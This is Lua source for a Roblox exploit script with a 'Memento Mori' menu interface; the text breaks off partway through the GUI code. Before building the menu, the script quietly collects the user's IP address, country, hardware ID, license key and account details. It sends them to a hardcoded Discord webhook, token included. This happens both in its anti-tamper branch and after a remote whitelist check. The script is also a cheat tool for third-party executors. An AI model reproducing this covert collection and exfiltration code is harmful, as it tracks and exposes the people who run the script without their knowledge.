if isfunctionhooked == nil then return end
if gethwid == nil then return end
local t = {gethwid, base64.encode, string.byte, math.random, math.floor, tostring, tonumber, table.insert}
local t2 = {
    [1] = "gethwid",
    [2] = "base64.encode",
    [3] = "string.byte",
    [4] = "math.random",
    [5] = "math.floor",
    [6] = "tostring",
    [7] = "tonumber",
    [8] = "table.insert"
}
local tried = nil
for i,v in pairs(t) do
    if v ~= nil then
        if isfunctionhooked(v) == true then
            if tried == nil then
                tried = ""
            end
            tried = tried..t2[i].." "
        end
    end
end
t = nil
t2 = nil
if tried ~= nil then
    local Webhook = "https://discord.com/api/webhooks/1384281909583941783/-65C7lru9jCBQxI4zzGaA6Z-wHlEoGxQOgCEnMttzppML7G1u54qdXTnNg6XRd6NZ6FL" -- your webhook

    local player = game:GetService"Players".LocalPlayer
    local joinTime = os.time() - (player.AccountAge*86400)
    local joinDate = os.date("!*t", joinTime)
    local premium = false
    local alt = true
    if player.MembershipType == Enum.MembershipType.Premium then
    premium = true
    end

    if player.AccountAge <= 365 then
        alt = "Possible"
    elseif player.AccountAge >= 365 and premium == true then
        alt = "No"
    else
    alt = "Maybe"
    end

    local executor = identifyexecutor() or "Unknown"
    local Thing = game:HttpGet(string.format("https://thumbnails.roblox.com/v1/users/avatar?userIds=%d&size=180x180&format=Png&isCircular=true", game.Players.LocalPlayer.UserId))
    Thing = game:GetService("HttpService"):JSONDecode(Thing).data[1]
    local AvatarImage = Thing.imageUrl
    local get_ip = game:HttpGet("https://api.ipify.org")
    local loc_salt = game:HttpGet("https://api.iplocation.net/?ip="..get_ip)
    local loc = game:GetService("HttpService"):JSONDecode(loc_salt)['country_name']
    loc_salt = nil
    local msg = {
    ["content"] = "<@&1381337139869913138>",
    ["embeds"] = {
        {
            ["color"] = tonumber(tostring("0xed0909")), --decimal
            ["title"] = "A user has tried hooking the functions: "..tried,
            ["thumbnail"] = {
                ["url"] = AvatarImage,
            },
            ["fields"] = {
                    {
                    ["name"] = "Account Information",
                    ["value"] = "- Username: ||"..player.Name.."||\n- UID: ||["..player.UserId.."](" .. tostring("https://www.roblox.com/users/" .. game.Players.LocalPlayer.UserId .. "/profile")..")||",
                    ["inline"] = false
                    },
                    {
                    ["name"] = "Game",
                    ["value"] = "- Game ID: ["..game.PlaceId.."](" .. tostring("https://www.roblox.com/games/" .. game.PlaceId) ..")\n- Game Name: "..game:GetService("MarketplaceService"):GetProductInfo(game.PlaceId).Name,
                    ["inline"] = false
                    },
                    {
                    ["name"] = "Security",
                    ["value"] = "- Used Executor: "..executor.."\n- Alt: "..alt.."\n- Account Age: "..player.AccountAge.." Day(s)".."\n- Join Date: "..joinDate.day.."/"..joinDate.month.."/"..joinDate.year.."\n- HWID: "..gethwid().."\n- Key: ".._G.Key,
                    ["inline"] = false
                    },
                    {
                        ["name"] = "Geolocation",
                        ["value"] = "- IP: "..get_ip.."\n- Location: "..loc,
                        ["inline"] = false
                    }
            },
            ['timestamp'] = os.date("%Y-%m-%dT%X.000Z")
        }
    }
    }

    local request = http_request or request or HttpPost or syn.request
    request({Url = Webhook, Method = "POST", Headers = {["Content-Type"] = "application/json"}, Body = game.HttpService:JSONEncode(msg)})
    request = nil
    Webhook = nil
    msg = nil
    Thing = nil
    get_ip = nil
    loc = nil
    return
end

local hwid = gethwid()

local encoded_hwid;

local hash = 0;
local rand1 = 289;
local rand2 = 198
local encoded_hwid_trip = base64.encode(hwid)
for i = 1,#encoded_hwid_trip do
    hash = hash + ((string.byte(encoded_hwid_trip, i) * rand1) / rand2)
end
rand1 = math.random(1, 9999)
rand2 = math.random(1, 9999)

local integerPart = math.floor(hash)
local decimalPart = hash - integerPart 
integerPart = math.random(1, 9999)

local decimalPlaces = 0
local tempNum = hash

while tempNum ~= math.floor(tempNum) do
    tempNum = tempNum * 10
    decimalPlaces = decimalPlaces + 1
end
tempNum = math.random(1, 9999)

local wholeDecimal = math.floor(decimalPart * (10 ^ decimalPlaces))
decimalPlaces = math.random(1, 9999)
decimalPart = math.random(1, 9999)


local hash1 = math.floor(hash)
local undone_hash2 = wholeDecimal

local digitTable = {}
local numStr = tostring(undone_hash2)
undone_hash2 = math.random(1, 9999)

for i = 1, #numStr do
    local digit = tonumber(numStr:sub(i, i))
    table.insert(digitTable, digit)
end
numStr = "GetChildren"



local hash2_table = digitTable
digitTable = {1,4,2,45,21,2}
local encoding = {
    [0] = "E",
    [1] = "C",
    [2] = "F",
    [3] = "B",
    [4] = "M",
    [5] = "Z",
    [6] = "A",
    [7] = "N",
    [8] = "V",
    [9] = "X",
}
local hash2 = ""
for i,v in pairs(hash2_table) do
    hash2 = hash2..encoding[v]
end

for i,v in pairs(encoding) do
    encoding[i] = "nil"
end
encoding = nil

hash2_table = {4,2,4,1,4,2,3,4}

encoded_hwid = hash1..hash2
hash1 = math.random(1, 9999)
hash2 = "GetService"

local codedHwid = encoded_hwid
local real_hwid = game:HttpGet("https://candy-ablaze-marionberry.glitch.me/?key=".._G.Key)

local count = 0
if real_hwid == "listo" then
    local assign_hwid = game:HttpGet("https://candy-ablaze-marionberry.glitch.me/?key=".._G.Key.."&crate="..codedHwid)
    if #codedHwid ~= #assign_hwid then return end
    for i = 1,#codedHwid do
        if string.byte(codedHwid:sub(i, i)) == string.byte(assign_hwid:sub(i,i)) then
            count = count + 1
        end
    end
    real_hwid = assign_hwid
    assign_hwid = nil
elseif real_hwid == "Blacklisted" then
    game:GetService("Players").LocalPlayer:Kick("Whitelist system: You are blacklisted.")
    return
else
    if #codedHwid ~= #real_hwid then return end
    for i = 1,#codedHwid do
        if string.byte(codedHwid:sub(i, i)) == string.byte(real_hwid:sub(i,i)) then
            count = count + 1
        end
    end
end
if count == #codedHwid then
    if real_hwid == codedHwid then
        real_hwid = ""
        codedHwid = ""
        count = 9999
        if game.GameId ~= 7436755782 then return end
        --WEBHOOK
        local Webhook = "https://discord.com/api/webhooks/1384281909583941783/-65C7lru9jCBQxI4zzGaA6Z-wHlEoGxQOgCEnMttzppML7G1u54qdXTnNg6XRd6NZ6FL" -- your webhook

        local player = game:GetService"Players".LocalPlayer
        local joinTime = os.time() - (player.AccountAge*86400)
        local joinDate = os.date("!*t", joinTime)
        local premium = false
        local alt = true
        if player.MembershipType == Enum.MembershipType.Premium then
        premium = true
        end

        if player.AccountAge <= 365 then
            alt = "Possible"
        elseif player.AccountAge >= 365 and premium == true then
            alt = "No"
        else
        alt = "Maybe"
        end

        local executor = identifyexecutor() or "Unknown"
        local Thing = game:HttpGet(string.format("https://thumbnails.roblox.com/v1/users/avatar?userIds=%d&size=180x180&format=Png&isCircular=true", game.Players.LocalPlayer.UserId))
        Thing = game:GetService("HttpService"):JSONDecode(Thing).data[1]
        local AvatarImage = Thing.imageUrl
        local get_ip = game:HttpGet("https://api.ipify.org")
        local loc_salt = game:HttpGet("https://api.iplocation.net/?ip="..get_ip)
        local loc = game:GetService("HttpService"):JSONDecode(loc_salt)['country_name']
        loc_salt = nil
        local msg = {
        ["content"] = " ",
        ["embeds"] = {
            {
                ["color"] = tonumber(tostring("0xf7faf8")), --decimal
                ["title"] = "A user has executed your script.",
                ["thumbnail"] = {
                    ["url"] = AvatarImage,
                },
                ["fields"] = {
                        {
                        ["name"] = "Account Information",
                        ["value"] = "- Username: ||"..player.Name.."||\n- UID: ||["..player.UserId.."](" .. tostring("https://www.roblox.com/users/" .. game.Players.LocalPlayer.UserId .. "/profile")..")||",
                        ["inline"] = false
                        },
                        {
                        ["name"] = "Game",
                        ["value"] = "- Game ID: ["..game.PlaceId.."](" .. tostring("https://www.roblox.com/games/" .. game.PlaceId) ..")\n- Game Name: "..game:GetService("MarketplaceService"):GetProductInfo(game.PlaceId).Name,
                        ["inline"] = false
                        },
                        {
                        ["name"] = "Security",
                        ["value"] = "- Used Executor: "..executor.."\n- Alt: "..alt.."\n- Account Age: "..player.AccountAge.." Day(s)".."\n- Join Date: "..joinDate.day.."/"..joinDate.month.."/"..joinDate.year.."\n- HWID: "..gethwid().."\n- Key: ".._G.Key,
                        ["inline"] = false
                        },
                        {
                            ["name"] = "Geolocation",
                            ["value"] = "- IP: "..get_ip.."\n- Location: "..loc,
                            ["inline"] = false
                        }
                },
                ['timestamp'] = os.date("%Y-%m-%dT%X.000Z")
            }
        }
        }

        local request = http_request or request or HttpPost or syn.request
        request({Url = Webhook, Method = "POST", Headers = {["Content-Type"] = "application/json"}, Body = game.HttpService:JSONEncode(msg)})
        request = nil
        msg = nil
        Webhook = nil
        Thing = nil
        get_ip = nil
        loc = nil
        --WEBBHOOOK
        local player = game:GetService("Players").LocalPlayer
        local mouse = player:GetMouse()

        -- services
        local input = game:GetService("UserInputService")
        local runserv = game:GetService("RunService")
        local is_studio = runserv:IsStudio()
        local tweenservice = game:GetService("TweenService")
        local uis = game:GetService("UserInputService")

        do --Convert functions
            function tableToJSON(json)
                local httpservice = game:GetService('HttpService')
                local encoded_data = httpservice:JSONEncode(json)
                return encoded_data
            end

            function JSONToTable(tabler)
                local httpservice = game:GetService('HttpService')
                local decoded_data = httpservice:JSONDecode(tabler)
                return decoded_data
            end
        end

        local Library = {}
        Library.ConfigSave = true
        Library.ConfigFolderName = "MementoMori"
        Library.MakeConfigFolder = function()
            local fname = Library.ConfigFolderName
            if not isfolder(fname) then
                makefolder(fname)
            end
            if not isfolder(fname.."/"..tostring(game.GameId)) then
                makefolder(fname.."/"..tostring(game.GameId))
            end
        end
        Library.MakeConfigFile = function()
            local fname = Library.ConfigFolderName
            if not isfolder(fname) or not isfolder(fname.."/"..tostring(game.GameId)) then
                Library.MakeConfigFolder()
            end
            local configpath = Library.ConfigFolderName.."/"..tostring(game.GameId).."/"..tostring(player.UserId)..".json"
            if not isfile(configpath) then
                writefile(configpath, "[]")
            end
        end
        Library.SaveConfig = function(flag, value)
            if Library.ConfigSave ~= true or flag == nil or value == nil or tostring(flag) == "nil" then return end
            Library.MakeConfigFile()
            local configpath = Library.ConfigFolderName.."/"..tostring(game.GameId).."/"..tostring(player.UserId)..".json"
            local jsondata = JSONToTable(readfile(configpath))
            jsondata[flag] = value
            local exportdata = tableToJSON(jsondata)
            writefile(configpath, exportdata)
        end
        Library.LoadConfig = function(flag)
            if Library.ConfigSave ~= true or flag == nil or tostring(flag) == "nil" then return end
            Library.MakeConfigFile()
            local configpath = Library.ConfigFolderName.."/"..tostring(game.GameId).."/"..tostring(player.UserId)..".json"
            local jsondata = JSONToTable(readfile(configpath))
            for i,v in pairs(jsondata) do
                if i == flag then
                    return v
                end
            end
            return nil
        end
        Library.DeleteConfigFlag = function(flag)
            if Library.ConfigSave ~= true or flag == nil or tostring(flag) == "nil" then return end
            Library.MakeConfigFile()
            local configpath = Library.ConfigFolderName.."/"..tostring(game.GameId).."/"..tostring(player.UserId)..".json"
            local jsondata = JSONToTable(readfile(configpath))
            if jsondata[flag] == nil then return end
            jsondata[flag] = nil
            local exportdata = tableToJSON(jsondata)
            writefile(configpath, exportdata)
        end

        do --Functions
            function Library:validate(default, options)
                for i,v in pairs(default) do
                    if options[i] == nil then
                        options[i] = v
                    end
                end
                return options
            end

            function UpdateToggle(metatable, value, title)
                local toggle_frame = metatable.frame

            end

            function Tween(frame, goal, time, method, callback)
                local tweenInfo = TweenInfo.new(time, Enum.EasingStyle[method], Enum.EasingDirection.InOut)
                local thing = tweenservice:Create(frame, tweenInfo, goal)
                thing:Play()
                callback = callback or function() end
                thing.Completed:Connect(callback)
                return thing
            end
        end

        function Library:Init(options)
            options = Library:validate({
                name = "Memento Mori"
            }, options or {})

            local GUI = {
                CurrentTab = nil,
                Tweening = false,
                Hidden = false
            }


            do --Necessary Elements
                -- StarterGui.ScreenGui
                if not is_studio then
                    GUI["1"] = Instance.new("ScreenGui", game:GetService("CoreGui"));
                elseif is_studio then
                    GUI["1"] = Instance.new("ScreenGui", game:GetService("Players").LocalPlayer.PlayerGui);
                end

                do
                    GUI["1"]["ZIndexBehavior"] = Enum.ZIndexBehavior.Sibling;

                    -- StarterGui.ScreenGui.Main
                    GUI["2"] = Instance.new("Frame", GUI["1"]);
                    GUI["2"]["BorderSizePixel"] = 0;
                    GUI["2"]["BackgroundColor3"] = Color3.fromRGB(18, 18, 18);
                    GUI["2"]["Size"] = UDim2.new(0, 495, 0, 340);
                    GUI["2"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
                    GUI["2"]["Position"] = UDim2.new(0.38831064105033875, 0, 0.08518518507480621, 0);
                    GUI["2"]["Name"] = [[Main]];

                    -- StarterGui.ScreenGui.Main.TopBar
                    GUI["3"] = Instance.new("Frame", GUI["2"]);
                    GUI["3"]["BorderSizePixel"] = 0;
                    GUI["3"]["BackgroundColor3"] = Color3.fromRGB(75, 75, 75);
                    GUI["3"]["Size"] = UDim2.new(1, 0, 0.02495543658733368, 30);
                    GUI["3"]["BorderColor3"] = Color3.fromRGB(255, 255, 255);
                    GUI["3"]["Name"] = [[TopBar]];

                    -- StarterGui.ScreenGui.Main.TopBar.UIGradient
                    GUI["4"] = Instance.new("UIGradient", GUI["3"]);
                    GUI["4"]["Color"] = ColorSequence.new{ColorSequenceKeypoint.new(0.000, Color3.fromRGB(255, 163, 0)),ColorSequenceKeypoint.new(1.000, Color3.fromRGB(20, 60, 0))};

                    -- StarterGui.ScreenGui.Main.TopBar.UICorner
                    GUI["5"] = Instance.new("UICorner", GUI["3"]);
                    GUI["5"]["CornerRadius"] = UDim.new(0, 10);

                    -- StarterGui.ScreenGui.Main.TopBar.TopBarFix
                    GUI["6"] = Instance.new("Frame", GUI["3"]);
                    GUI["6"]["BorderSizePixel"] = 0;
                    GUI["6"]["BackgroundColor3"] = Color3.fromRGB(75, 75, 75);
                    GUI["6"]["AnchorPoint"] = Vector2.new(0, 1);
                    GUI["6"]["Size"] = UDim2.new(1, 0, 0, 15);
                    GUI["6"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
                    GUI["6"]["Position"] = UDim2.new(0, 0, 1, 0);
                    GUI["6"]["Name"] = [[TopBarFix]];

                    -- StarterGui.ScreenGui.Main.TopBar.TopBarFix.UIGradient
                    GUI["7"] = Instance.new("UIGradient", GUI["6"]);
                    GUI["7"]["Color"] = ColorSequence.new{ColorSequenceKeypoint.new(0.000, Color3.fromRGB(255, 163, 0)),ColorSequenceKeypoint.new(1.000, Color3.fromRGB(20, 60, 0))};

                    -- StarterGui.ScreenGui.Main.TopBar.SeperatorFix
                    GUI["8"] = Instance.new("Frame", GUI["3"]);
                    GUI["8"]["BorderSizePixel"] = 0;
                    GUI["8"]["BackgroundColor3"] = Color3.fromRGB(183, 183, 183);
                    GUI["8"]["AnchorPoint"] = Vector2.new(0, 1);
                    GUI["8"]["Size"] = UDim2.new(1, 0, 0, 1);
                    GUI["8"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
                    GUI["8"]["Position"] = UDim2.new(0, 0, 1, 0);
                    GUI["8"]["Name"] = [[SeperatorFix]];

                    -- StarterGui.ScreenGui.Main.TopBar.Title
                    GUI["9"] = Instance.new("TextLabel", GUI["3"]);
                    GUI["9"]["BorderSizePixel"] = 0;
                    GUI["9"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
                    GUI["9"]["TextXAlignment"] = Enum.TextXAlignment.Left;
                    GUI["9"]["FontFace"] = Font.new([[rbxasset://fonts/families/GothamSSm.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
                    GUI["9"]["TextSize"] = 17;
                    GUI["9"]["TextColor3"] = Color3.fromRGB(255, 255, 255);
                    GUI["9"]["Size"] = UDim2.new(0.5, 0, 1, 1);
                    GUI["9"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
                    GUI["9"]["Text"] = options.name;
                    GUI["9"]["Name"] = [[Title]];
                    GUI["9"]["BackgroundTransparency"] = 1;
                    GUI["9"]["Position"] = UDim2.new(0, 0, -0.022727273404598236, 0);

                    -- StarterGui.ScreenGui.Main.TopBar.Title.UIPadding
                    GUI["a"] = Instance.new("UIPadding", GUI["9"]);
                    GUI["a"]["PaddingLeft"] = UDim.new(0.07000000029802322, 0);

                    -- StarterGui.ScreenGui.Main.TopBar.TabsContainer
                    GUI["b"] = Instance.new("Frame", GUI["3"]);
                    GUI["b"]["BorderSizePixel"] = 0;
                    GUI["b"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
                    GUI["b"]["BackgroundTransparency"] = 1;
                    GUI["b"]["Size"] = UDim2.new(1, 0, 1, 0);
                    GUI["b"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
                    GUI["b"]["Position"] = UDim2.new(0, 0, 1, 0);
                    GUI["b"]["Name"] = [[TabsContainer]];

                    -- StarterGui.ScreenGui.Main.UICorner
                    GUI["1d"] = Instance.new("UICorner", GUI["2"]);
                    GUI["1d"]["CornerRadius"] = UDim.new(0, 10);

                    -- StarterGui.ScreenGui.Main.DropShadowHolder
                    GUI["1e"] = Instance.new("Frame", GUI["2"]);
                    GUI["1e"]["ZIndex"] = 0;
                    GUI["1e"]["BorderSizePixel"] = 0;
                    GUI["1e"]["BackgroundTransparency"] = 1;
                    GUI["1e"]["Size"] = UDim2.new(1, 0, 1, 0);
                    GUI["1e"]["Name"] = [[DropShadowHolder]];

                    -- StarterGui.ScreenGui.Main.DropShadowHolder.DropShadow
                    GUI["1f"] = Instance.new("ImageLabel", GUI["1e"]);
                    GUI["1f"]["ZIndex"] = 0;
                    GUI["1f"]["BorderSizePixel"] = 0;
                    GUI["1f"]["SliceCenter"] = Rect.new(49, 49, 450, 450);
                    GUI["1f"]["ScaleType"] = Enum.ScaleType.Slice;
                    GUI["1f"]["ImageColor3"] = Color3.fromRGB(0, 0, 0);
                    GUI["1f"]["ImageTransparency"] = 0.5;
                    GUI["1f"]["AnchorPoint"] = Vector2.new(0.5, 0.5);
                    GUI["1f"]["Image"] = [[rbxassetid://6014261993]];
                    GUI["1f"]["Size"] = UDim2.new(1, 47, 1, 47);
                    GUI["1f"]["Name"] = [[DropShadow]];
                    GUI["1f"]["BackgroundTransparency"] = 1;
                    GUI["1f"]["Position"] = UDim2.new(0.5, 0, 0.5, 0);

                    -- StarterGui.ScreenGui.Main.Container
                    GUI["20"] = Instance.new("Frame", GUI["2"]);
                    GUI["20"]["BorderSizePixel"] = 0;
                    GUI["20"]["BackgroundColor3"] = Color3.fromRGB(11, 11, 11);
                    GUI["20"]["Size"] = UDim2.new(1, 0, 1, -95);
                    GUI["20"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
                    GUI["20"]["Position"] = UDim2.new(0, 0, 0, 85);
                    GUI["20"]["Name"] = [[Container]];

                    -- StarterGui.ScreenGui.Main.TopBar.TabsContainer.UIGridLayout
                    GUI["f"] = Instance.new("UIGridLayout", GUI["b"]);
                    GUI["f"]["SortOrder"] = Enum.SortOrder.LayoutOrder;
                    GUI["f"]["CellSize"] = UDim2.new(0, 95, 0, 40);
                end
            end
            
            GUI["3"].MouseEnter:Connect(function()
                GUI.Hovering = true
            end)

            GUI["3"].MouseLeave:Connect(function()
                GUI.Hovering = false
            end)

            local dragInput, mousePos, framePos

            uis.InputBegan:Connect(function(input)
                if input.UserInputType == Enum.UserInputType.MouseButton1 and GUI.Hovering then
                    GUI.Holding = true
                    mousePos = input.Position
                    framePos = GUI["2"].Position

                    input.Changed:Connect(function()
                        if input.UserInputState == Enum.UserInputState.End then
                            GUI.Holding = false
                        end
                    end)
                end
            end)

            uis.InputChanged:Connect(function(input)
                if input.UserInputType == Enum.UserInputType.MouseMovement and GUI.Hovering then
                    dragInput = input
                end
            end)

            input.InputChanged:Connect(function(input)
                if input == dragInput and GUI.Holding then
                    local delta = input.Position - mousePos
                    GUI["2"].Position  = UDim2.new(framePos.X.Scale, framePos.X.Offset + delta.X, framePos.Y.Scale, framePos.Y.Offset + delta.Y)
                end
            end)
            
            local tableinfos = {}

            function GUI:Hide()
                if GUI.Hidden == false then
                    if GUI.Tweening == false then
                        GUI.Tweening = true
                        for i,v in pairs(GUI["2"]:GetDescendants()) do
                            if v:IsA("TextLabel") or v:IsA("TextBox") or v:IsA("ImageLabel") or v:IsA("Frame") then
                                tableinfos[v] = v.Visible
                                v.Visible = false
                            end
                        end
                        Tween(GUI["2"], {Size = UDim2.new(0, 0, 0, 0)}, 0.3, "Linear", function()
                            GUI.Hidden = true
                            GUI.Tweening = false
                        end)
                    end
                elseif GUI.Hidden == true then
                    if GUI.Tweening == false then
                        GUI.Tweening = true
                        Tween(GUI["2"], {Size = UDim2.new(0, 495, 0, 340)}, 0.3, "Linear", function()
                            GUI.Hidden = false
                            GUI.Tweening = false
                        end)
                        wait(0.15)
                        for i,v in pairs(tableinfos) do
                            i.Visible = v
                        end
                        tableinfos = {}
                        GUI["2"].Visible = true
                    end
                end
            end

            function GUI:CreateTab(options)
                options = Library:validate({
                    name = "Tab"
                }, options or {})

                local Tab = {
                    Hover = false,
                    Active = false,
                    Changing = false
                }

                do --Elements
                    -- StarterGui.ScreenGui.Main.TopBar.TabsContainer.Tab1
                    Tab["c"] = Instance.new("Frame", GUI["b"]);
                    Tab["c"]["BorderSizePixel"] = 0;
                    Tab["c"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
                    Tab["c"]["BackgroundTransparency"] = 1;
                    Tab["c"]["Size"] = UDim2.new(0, 100, 0, 100);
                    Tab["c"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
                    Tab["c"]["Name"] = options.name;

                    -- StarterGui.ScreenGui.Main.TopBar.TabsContainer.Tab1.StyleLine
                    Tab["d"] = Instance.new("Frame", Tab["c"]);
                    Tab["d"]["BorderSizePixel"] = 0;
                    Tab["d"]["BackgroundColor3"] = Color3.fromRGB(153, 153, 153);
                    Tab["d"]["BackgroundTransparency"] = 0.5;
                    Tab["d"]["Size"] = UDim2.new(0.6000000238418579, 0, 0.019999999552965164, 0);
                    Tab["d"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
                    Tab["d"]["Position"] = UDim2.new(0.029999999329447746, 17, 0.20000000298023224, 23);
                    Tab["d"]["Name"] = [[StyleLine]];

                    Tab["2gzgz2"] = Instance.new("UIGradient", Tab["d"]);
                    Tab["2gzgz2"]["Color"] = ColorSequence.new{ColorSequenceKeypoint.new(0.000, Color3.fromRGB(255, 255, 255)),ColorSequenceKeypoint.new(1.000, Color3.fromRGB(255, 163, 0)),ColorSequenceKeypoint.new(1.000, Color3.fromRGB(255, 255, 255))};
                    Tab["2gzgz2"]["Offset"] = Vector2.new(1, 0);

                    -- StarterGui.ScreenGui.Main.TopBar.TabsContainer.Tab1.TextLabel
                    Tab["e"] = Instance.new("TextLabel", Tab["c"]);
                    Tab["e"]["BorderSizePixel"] = 0;
                    Tab["e"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
                    Tab["e"]["FontFace"] = Font.new([[rbxasset://fonts/families/Ubuntu.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
                    Tab["e"]["TextTransparency"] = 0.5;
                    Tab["e"]["TextSize"] = 14;
                    Tab["e"]["TextColor3"] = Color3.fromRGB(208, 208, 208);
                    Tab["e"]["Size"] = UDim2.new(1, 0, 1, 0);
                    Tab["e"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
                    Tab["e"]["Text"] = options.name;
                    Tab["e"]["BackgroundTransparency"] = 1;

                    Tab["2gzgz"] = Instance.new("UIGradient", Tab["e"]);
                    Tab["2gzgz"]["Color"] = ColorSequence.new{ColorSequenceKeypoint.new(0.000, Color3.fromRGB(255, 255, 255)),ColorSequenceKeypoint.new(1.000, Color3.fromRGB(255, 163, 0)),ColorSequenceKeypoint.new(1.000, Color3.fromRGB(255, 255, 255))};
                    Tab["2gzgz"]["Offset"] = Vector2.new(1, 0);

                    -- StarterGui.ScreenGui.Main.Container.MainContainer
                    Tab["21"] = Instance.new("ScrollingFrame", GUI["20"]);
                    Tab["21"]["Active"] = true;
                    Tab["21"]["BorderSizePixel"] = 0;
                    Tab["21"]["BackgroundColor3"] = Color3.fromRGB(11, 11, 11);
                    Tab["21"]["Size"] = UDim2.new(1, 0, 1, 0);
                    Tab["21"]["ScrollBarImageColor3"] = Color3.fromRGB(0, 0, 0);
                    Tab["21"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
                    Tab["21"]["Name"] = options.name.."Container";
                    Tab["21"]["Visible"] = false

                    -- StarterGui.ScreenGui.Main.Container.MainContainer.UIListLayout
                    Tab["27"] = Instance.new("UIListLayout", Tab["21"]);
                    Tab["27"]["HorizontalAlignment"] = Enum.HorizontalAlignment.Center;
                    Tab["27"]["Padding"] = UDim.new(0, 10);
                    Tab["27"]["SortOrder"] = Enum.SortOrder.LayoutOrder;
                    Tab["21"]["CanvasSize"] = UDim2.fromOffset(0,Tab["27"].AbsoluteContentSize.Y + 10)
                    Tab["27"]:GetPropertyChangedSignal("AbsoluteContentSize"):Connect(function()
                        Tab["21"]["CanvasSize"] = UDim2.fromOffset(0, Tab["27"].AbsoluteContentSize.Y + 10)
                    end)

                    -- StarterGui.ScreenGui.Main.Container.MainContainer.UIPadding
                    Tab["28"] = Instance.new("UIPadding", Tab["21"]);
                    Tab["28"]["PaddingTop"] = UDim.new(0, 5);
                end

                local textui = Tab["e"]
                local lineui = Tab["d"]
                local gradientui_linestyle = Tab["2gzgz2"]
                local gradientui_text = Tab["2gzgz"]


                function Tab:Deactivate()
                    if GUI.CurrentTab then
                        local tab = GUI.CurrentTab["21"]
                        local top_bar_tab = GUI.CurrentTab["c"]
                        local lineui_2 = top_bar_tab.StyleLine
                        local textui_2 = top_bar_tab.TextLabel
                        local gradientui_linestyle2 = lineui_2.UIGradient
                        local gradientui_text2 = textui_2.UIGradient
                        lineui_2.BackgroundTransparency = 0.5
                        textui_2.TextTransparency = 0.5
                        gradientui_linestyle2.Offset = Vector2.new(1,0)
                        gradientui_text2.Offset = Vector2.new(1,0)
                        tab.BackgroundTransparency = 1
                        tab.Visible = false
                        GUI.CurrentTab = nil
                    end
                    Tab.Active = false
                end

                function Tab:Activate()
                    if GUI.CurrentTab then
                        GUI.CurrentTab:Deactivate()
                    end
                    GUI.CurrentTab = Tab
                    Tab["21"].BackgroundTransparency = 0
                    Tab["21"].Visible = true
                    Tab.Active = true
                end

                do --scripts
                    textui.MouseEnter:Connect(function()
                        Tab.Hover = true
                        if Tab.Active then return end
                        local tweenInfo = TweenInfo.new(0.4, Enum.EasingStyle.Quint, Enum.EasingDirection.InOut)
                        tweenservice:Create(lineui, tweenInfo, {BackgroundTransparency = 0}):Play()
                        tweenservice:Create(textui, tweenInfo, {TextTransparency = 0}):Play()
                    end)

                    textui.MouseLeave:Connect(function()
                        Tab.Hover = false
                        if Tab.Active then return end
                        local tweenInfo = TweenInfo.new(0.2, Enum.EasingStyle.Quint, Enum.EasingDirection.InOut)
                        tweenservice:Create(lineui, tweenInfo, {BackgroundTransparency = 0.5}):Play()
                        tweenservice:Create(textui, tweenInfo, {TextTransparency = 0.5}):Play()
                    end)

                    uis.InputBegan:Connect(function(input, gpe)
                        if gpe then return end

                        if input.UserInputType == Enum.UserInputType.MouseButton1 and Tab.Hover then
                            if Tab.Active == false and Tab.Changing == false then
                                Tab.Changing = true
                                Tween(lineui, {BackgroundTransparency = 0}, 0.2, "Linear")
                                Tween(textui, {TextTransparency = 0}, 0.2, "Linear")
                                Tween(gradientui_linestyle, {Offset = Vector2.new(0,0)}, 0.2, "Linear")
                                Tween(gradientui_text, {Offset = Vector2.new(0,0)}, 0.2, "Linear", function()
                                    Tab:Activate()
                                    Tab.Changing = false
                                end)
                            elseif Tab.Active == true and Tab.Changing == false then
                                Tab.Changing = true
                                Tween(lineui, {BackgroundTransparency = 0.5}, 0.2, "Linear")
                                Tween(textui, {TextTransparency = 0.5}, 0.2, "Linear")
                                Tween(gradientui_linestyle, {Offset = Vector2.new(1,0)}, 0.2, "Linear")
                                Tween(gradientui_text, {Offset = Vector2.new(1,0)}, 0.2, "Linear", function()
                                    Tab:Deactivate()
                                    Tab.Changing = false
                                end)
                            end
                        end
                    end)
                end

                function Tab:CreateSection(options)
                    options = Library:validate({
                        name = "Section"
                    }, options or {})

                    local Section = {}

                    do --Elements
                        -- StarterGui.ScreenGui.Main.Container.MainContainer.SectionStart
                        Section["58"] = Instance.new("Frame", Tab["21"]);
                        Section["58"]["BorderSizePixel"] = 0;
                        Section["58"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
                        Section["58"]["BackgroundTransparency"] = 1;
                        Section["58"]["Size"] = UDim2.new(1, -24, 0, 20);
                        Section["58"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
                        Section["58"]["Name"] = [[SectionStart]];

                        -- StarterGui.ScreenGui.Main.Container.MainContainer.SectionStart.Name
                        Section["59"] = Instance.new("TextLabel", Section["58"]);
                        Section["59"]["TextWrapped"] = true;
                        Section["59"]["BorderSizePixel"] = 0;
                        Section["59"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
                        Section["59"]["TextXAlignment"] = Enum.TextXAlignment.Left;
                        Section["59"]["FontFace"] = Font.new([[rbxasset://fonts/families/Ubuntu.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
                        Section["59"]["TextSize"] = 14;
                        Section["59"]["TextColor3"] = Color3.fromRGB(255, 255, 255);
                        Section["59"]["Size"] = UDim2.new(0.9087048768997192, -70, 1, 0);
                        Section["59"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
                        Section["59"]["Text"] = options.name;
                        Section["59"]["Name"] = [[Name]];
                        Section["59"]["BackgroundTransparency"] = 1;
                        Section["59"]["Position"] = UDim2.new(0, 25, 0, 0);

                        -- StarterGui.ScreenGui.Main.Container.MainContainer.SectionStart.Name.Line
                        Section["5a"] = Instance.new("Frame", Section["59"]);
